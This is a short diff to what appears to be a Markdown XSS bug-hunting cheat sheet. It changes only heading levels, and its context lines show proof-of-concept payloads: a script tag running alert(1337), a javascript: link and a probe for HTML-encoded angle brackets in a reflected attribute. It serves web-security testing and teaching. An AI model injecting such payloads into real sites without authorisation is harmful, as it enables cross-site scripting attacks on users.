@@ -1,4 +1,4 @@
-### Testing Alert
+# Testing Alert
 ```js
 <script>alert(1337)</script>
 ```
@@ -26,7 +26,7 @@
 <a href="javascript:alert('XSS')">Click me</a>
 <img src=https://i.imgflip.com/8uo0t9.jpg>
 ```
-### Reflected XSS into attribute with angle brackets HTML-encoded
+# Reflected XSS into attribute with angle brackets HTML-encoded
 Inject ```<xss123>'"``` and see if the angle ```<>``` brackets are encoded with ```&lt;``` and ```&gt;```.
   ![Screenshot from 2024-06-12 22-48-00](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/4bb3d36b-cef6-49ae-ab0d-a4c6ad9c8553)<br>
 If this is the case, you should inject this payloads. 
